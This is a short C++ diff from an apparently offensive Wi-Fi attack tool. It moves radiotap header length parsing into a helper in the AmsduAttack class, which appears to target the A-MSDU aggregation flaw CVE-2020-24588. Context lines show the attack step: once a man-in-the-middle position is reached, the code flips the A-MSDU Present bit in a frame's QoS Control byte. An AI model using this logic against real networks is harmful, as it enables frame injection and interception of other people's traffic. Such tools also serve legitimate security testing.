@@ -40,9 +40,8 @@ void AmsduAttack::run(RunStatus &rs, int timeout_sec) {
 bool AmsduAttack::is_trigger_frame(const frame_raw_t &raw) const {
     if(watch_inner_size == 0 || cve24588_flipped_) return false;
     if(client_state.get_state() < ClientState::GotMitm) return false;
-    if(raw.size() < 4) return false;
-
-    const uint16_t rt_len = static_cast<uint16_t>(raw[2]) | static_cast<uint16_t>(raw[3]) << 8;
+    const uint16_t rt_len = radiotap::get_rt_len(raw);
+    if(!rt_len) return false;
     if(raw.size() < rt_len + 26u) return false;  // need MAC hdr + QoS byte
 
     const size_t inner = raw.size() - rt_len;
@@ -58,8 +57,8 @@ bool AmsduAttack::is_trigger_frame(const frame_raw_t &raw) const {
 }
 
 void AmsduAttack::flip_amsdu_bit(frame_raw_t &raw) {
-    if(raw.size() < 4) return;
-    const uint16_t rt_len = static_cast<uint16_t>(raw[2]) | (static_cast<uint16_t>(raw[3]) << 8);
+    const uint16_t rt_len = radiotap::get_rt_len(raw);
+    if(!rt_len) return;
     const size_t qos_off = rt_len + 24u;  // 802.11 MAC header = 24 bytes
     if(raw.size() <= qos_off) return;
     raw[qos_off] |= 0x80;  // A-MSDU Present = bit 7 of QoS Control byte 0
